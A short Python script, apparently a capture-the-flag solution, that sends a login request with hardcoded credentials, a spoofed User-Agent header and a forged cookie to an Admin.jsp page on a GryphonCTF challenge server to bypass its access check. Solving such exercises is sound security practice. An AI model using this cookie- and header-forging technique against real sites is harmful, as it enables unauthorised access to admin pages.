#!/usr/bin/env python3

import requests
import re

data = {
    'btnSubmit': 'Login',
    'num': 0,
    'pwd': 'TOPSECRET',
    'user': 'goodpassword',
}
headers = {
    'User-Agent': 'iwonderthelengthofthisarray',
}

# cookies = requests.utils.dict_from_cookiejar(response.cookies)
cookies = dict(CookieDonationBox='1')
response = requests.post("http://web.chal.gryphonctf.com:17561/Admin.jsp",
                         data=data, cookies=cookies, headers=headers)
print(response.text)
